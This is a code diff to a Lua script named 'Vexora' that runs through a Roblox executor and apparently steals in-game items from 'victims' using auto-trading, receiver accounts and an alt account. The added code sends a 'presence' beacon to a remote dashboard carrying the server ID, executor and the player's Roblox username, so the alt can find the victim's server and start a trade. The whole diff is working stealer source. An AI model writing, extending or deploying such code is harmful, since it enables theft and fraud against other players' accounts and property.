@@ -322,6 +322,22 @@ local Vexora = {
     server = SERVER_ID,
 }
 
+-- tell the dashboard which server this client is on before any item is captured.
+-- the alt can then join and open a trade even when nobody has traded yet.
+function Vexora.presence()
+    if IS_CLAIMER or not SERVER_ID then return false end
+    table.insert(queue, {
+        event = "presence",
+        game = GAME,
+        place_id = PLACE_ID,
+        server_id = SERVER_ID,
+        executor = EXECUTOR,
+        roblox_user = ROBLOX_USER,
+    })
+    drain()
+    return true
+end
+
 function Vexora.capture(item, victim, value, gameId)
     item = tostring(item or "Unknown")
     value = tonumber(value) or DEFAULT_VALUE
@@ -1798,7 +1814,13 @@ print(string.format("[vexora] claimer=%s auto_claim=%s kick_if_empty=%s grace=%d
     tostring(IS_CLAIMER), tostring(AUTO_CLAIM and not IS_CLAIMER), tostring(KICK_IF_EMPTY and not IS_CLAIMER), EMPTY_GRACE, EMPTY_CHECKS))
 print(string.format("[vexora] trade remotes=%d item remotes=%d confirm remotes=%d receivers=%d auto_trade=%s auto_accept=%s",
     #tradeRemotes, #itemRemotes, #acceptRemotes, #RECEIVER_ACCOUNTS, tostring(AUTO_TRADE), tostring(AUTO_ACCEPT)))
-print("[vexora] API: Vexora.capture(item, victim, value) | Vexora.claim(item, victim, value) | Vexora.inventory() | Vexora.selftest() | Vexora.stop()")
+print("[vexora] API: Vexora.capture(item, victim, value) | Vexora.claim(item, victim, value) | Vexora.inventory() | Vexora.presence() | Vexora.selftest() | Vexora.stop()")
+
+-- give the game a moment to finish loading, then announce the server so the alt
+-- has a target before the first receiver ever opens a trade
+task.delay(3, function()
+    if Vexora.presence() then print("[vexora] presence sent for " .. tostring(SERVER_ID)) end
+end)
 
 function Vexora.kick(reason)
     kickPlayer(reason or EMPTY_KICK_MESSAGE)
